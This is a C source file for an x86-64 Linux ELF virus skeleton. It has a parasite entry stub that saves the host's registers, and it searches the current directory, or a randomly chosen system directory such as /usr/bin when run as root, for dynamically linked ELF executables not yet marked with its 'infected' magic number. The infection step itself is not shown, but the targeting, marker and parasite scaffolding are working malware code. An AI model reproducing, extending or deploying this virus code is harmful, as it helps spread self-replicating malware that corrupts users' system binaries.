#include "private.h"

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

extern long real_start;

struct bootstrap_data {
	int argc;
	char **argv;
};

struct bootstrap_data bootstrap __attribute__((section(".data"))) = { 0x00 };

#define DIR_COUNT 3
static const char *dirs[] = {
		"/usr/bin",
		"/bin",
		"/usr/sbin",
		NULL
		};


_start()
{	
	/*
	 * Get argc, and char **argv
	 */
        asm __volatile__("mov 8(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        asm __volatile__("lea 16(%%rbp), %%rcx " : "=c" (bootstrap.argv));
	
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	asm __volatile__ (".globl real_start	\n"
 	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	\n"
	 "call do_main	\n"
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"
	 "jmp end_code	\n"
	);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.  Each heap area maxes out at 32k
 * and it is up to the caller of vx_malloc() to keep track
 * of how much space has been used. For our uses this is
 * perfect.
 */
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += len;
	**mem = 0;
	return (void *)((char *)*mem - len);
}

void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	addr &= ~4095;
	mem = (uint8_t *)addr;
	_munmap(mem, 4096);
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */

uint32_t get_random_number(int max)
{
	long rsp;
        asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
	_srand(rsp);
	return _rand() % max;
}
	
char * randomly_select_dir(void) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir)
{
	static uint8_t *heap = NULL;
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, &heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, strlen(dir));
	ptr[strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[strlen(dir) + 1], exe, strlen(exe));
	return ptr;
}
	
/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;
	
	fd = _open(filename, O_RDONLY);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if (mem[0] != 0x7f && strncmp((char *)&mem[1], "ELF", 3)) {
		ret = -1;
		goto out;
	}
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER) {//already infected? Then skip this file
		ret = -1;
		goto out;
	}
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) {
		ret = -1;
		goto out;
	}
	
out:
	return ret;

}
void do_main(void)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, dbuf[1024];
	struct stat st;
	mode_t mode;
	uint32_t rnum;

	dir = _getuid() != 0 ? "." : randomly_select_dir();
	
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
	
	dd = _open(dir, O_RDONLY | O_DIRECTORY);
	if (dd < 0) {
		DEBUG_PRINT("open failed\n");
		return;
	}
	
	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
		if (nread < 0) {
			DEBUG_PRINT("getdents64 failed\n");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
#if 0
			rnum = get_random_number(10);
			DEBUG_PRINT("lucky number: %d\n", rnum);
			if (rnum != LUCKY_NUMBER)
				continue;
#endif
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(full_path(d->d_name, dir)) < 0)
				continue;
			DEBUG_PRINT("infecting file: %s\n", d->d_name);
		}
		
	}
}
void end_code() {

	Exit(0);

}

